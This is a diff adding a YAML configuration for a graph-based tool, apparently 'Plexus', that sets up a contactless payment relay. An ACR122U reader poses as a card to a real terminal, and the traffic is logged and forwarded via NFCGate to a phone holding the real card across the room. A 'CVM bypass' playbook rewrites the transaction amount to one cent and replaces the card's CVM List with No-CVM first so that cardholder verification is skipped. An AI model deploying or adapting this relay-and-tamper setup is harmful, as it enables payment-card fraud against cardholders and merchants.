@@ -1,0 +1,89 @@
+# Plexus graph.
+#
+# Edges read "from: node:port" to "to: node:port" — always from the side that
+# asks to the side that answers, which is the direction a command APDU travels.
+# Responses come back along the same edge.
+#
+# This is the rig the editor opens with: an ACR122U pretending to be a card to
+# a real terminal, the traffic logged and rewritten on the way through, and the
+# card itself held in a phone's field on the other side of the room.
+version: 1
+name: contactless relay to a phone
+
+hosts:
+  - id: workbench
+    name: workbench
+    note: the machine running Plexus
+  - id: phone
+    name: android phone
+    address: 192.168.1.24
+
+nodes:
+  - id: acr122u-target-1
+    type: acr122u.target
+    host: workbench
+    at: [40, 160]
+    config:
+      device: acr122u:001
+      splitResponses: false
+
+  - id: trace-1
+    type: trace
+    host: workbench
+    at: [300, 160]
+    config:
+      detail: tlv
+      path: logs/trace.jsonl
+
+  - id: mutation-1
+    type: mutation
+    label: CVM bypass
+    host: workbench
+    at: [560, 160]
+    config:
+      logMutations: true
+      playbook: |
+        # COMBO-A — CVM bypass via contactless amount threshold
+        enabled: true
+        log_mutations: true
+
+        pdol_mutations:
+          - tag: "9F02"
+            value: "000000000001"
+            enabled: true
+            comment: "Amount: 1 cent — triggers No-CVM amount threshold rule"
+          - tag: "5F2A"
+            value: "0978"
+            enabled: true
+            comment: "Currency: EUR — synchronise with amount"
+
+        response_mutations:
+          - tag: "8E"
+            mode: replace
+            value: "00000000000000001F03"
+            enabled: true
+            comment: "CVM List: No-CVM first"
+
+        afl_mutations: []
+        dol_mutations: []
+
+  - id: nfcgate-1
+    type: nfcgate
+    host: phone
+    at: [820, 160]
+    config:
+      host: 192.168.1.24
+      port: 5566
+      session: 1
+      cafile: ""
+
+edges:
+  - id: acr122u-target-1:card->trace-1:terminal
+    from: acr122u-target-1:card
+    to: trace-1:terminal
+  - id: trace-1:card->mutation-1:terminal
+    from: trace-1:card
+    to: mutation-1:terminal
+  - id: mutation-1:card->nfcgate-1:terminal
+    from: mutation-1:card
+    to: nfcgate-1:terminal
